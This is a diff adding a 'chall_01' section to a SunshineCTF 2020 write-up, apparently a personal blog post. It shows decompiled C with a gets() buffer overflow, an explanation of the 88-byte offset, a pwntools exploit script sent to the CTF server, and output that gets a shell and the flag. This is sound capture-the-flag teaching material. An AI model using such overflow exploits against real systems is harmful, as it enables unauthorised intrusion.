@@ -125,8 +125,8 @@ Note that we needed to use a pack function on the constant to send. The binary w
 
 Running the program gives us shell access on Sunshine's server:
 ```sh
-meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshinectf2020$ ./chall_00.py REMOTE
-[*] '/mnt/c/Users/meraxes/dev/ctf/sunshinectf2020/chall_00'
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_00.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_00'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    No canary found
@@ -142,4 +142,79 @@ flag.txt
 $ cat flag.txt
 sun{burn-it-down-6208bbc96c9ffce4}
 $ 
+```
+
+## chall_01
+---
+
+Let's take a peek at the decompilation output:
+```c
+void main(void)
+
+{
+  char local_68 [64];
+  char local_28 [24];
+  int local_10;
+  int local_c;
+  
+  puts("Long time ago, you called upon the tombstones");
+  fgets(local_28,0x13,stdin);
+  gets(local_68);
+  if (local_c == 0xfacade) {
+    system("/bin/sh");
+  }
+  if (local_10 == 0xfacade) {
+    system("/bin/sh");
+  }
+  return;
+}
+```
+
+This program is very similar to chall_00. The difference is that it takes two inputs now (the first being protected against buffer overflows). The inputs are read into two different `char` arrays. Since the second input is using `gets`, we can still perform the same attack as before. 
+
+`gets` puts its value into `local_68`. That array has a size of 64 bytes. After filling it, we need to overwrite 24 more bytes to fill `local_28`. At this point we are at the memory reserved for `local_10`. The constant `0xfacade` can be written here in our input.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.binary = ELF('./chall_01')
+
+if args.REMOTE:
+    io = remote('chal.2020.sunshinectf.org', 30001)
+else:
+    io = process(context.binary.path)
+print(io.recvline())
+
+buffer = 'A' * 88
+payload = p32(0xfacade)
+exploit = flat(buffer, payload)
+
+io.sendline('giveflagpls')
+print("Sending: ", exploit)
+io.sendline(exploit)
+
+io.interactive()
+```
+
+Running our exploit:
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_01.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_01'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done
+b'Long time ago, you called upon the tombstones\n'
+Sending:  b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00'
+[*] Switching to interactive mode
+$ ls
+chall_01
+flag.txt
+$ cat flag.txt
+sun{eternal-rest-6a5ee49d943a053a}
+$  
 ```
